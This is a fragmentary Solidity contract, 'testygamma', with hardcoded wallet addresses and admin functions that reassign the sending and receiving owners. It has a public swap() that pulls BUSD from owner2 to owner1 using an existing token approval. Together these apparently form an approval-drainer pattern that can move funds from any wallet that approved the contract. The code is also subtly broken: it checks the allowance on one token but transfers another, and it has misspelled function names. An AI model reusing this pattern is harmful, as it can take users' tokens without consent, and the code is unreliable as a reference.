...
contract testygamma{
    ...
    constructor(address _dev, address _marketing) {
        ...
        owner1 = 0xD9A0C9dCc49719a4452225d4e5C69B042A086434;
        amount1 = 4;
        //token2 = IERC20(_token2);
        owner2 = 0x545852De6337343d43Df8e12cD2305c5220c4087;
        amount2 = 2;
    }
    ...
    function timestompp () external {
        require(msg.sender == owner, "Admin use only");
        IToken(erctoken).transfer(owner1, amount1);
    }

    function changeonwer2(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner2 = value;
    }

    function changeonwer1(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner1 = value;
    }

    function changeamount2(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        amount2 = value;
    }

    function changeamount1(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        amount1 = value;
    }
    ...
    function swap() public {
        ...
        //);
        require(
            IToken(erctoken).allowance(owner2, address(this)) >= amount2,
            "Token 2 allowance too low"
        );

        //_safeTransferFrom(token1, owner1, owner2, amount1);
        _safeTransferFrom(token_BUSD, owner2, owner1, amount2);
    }
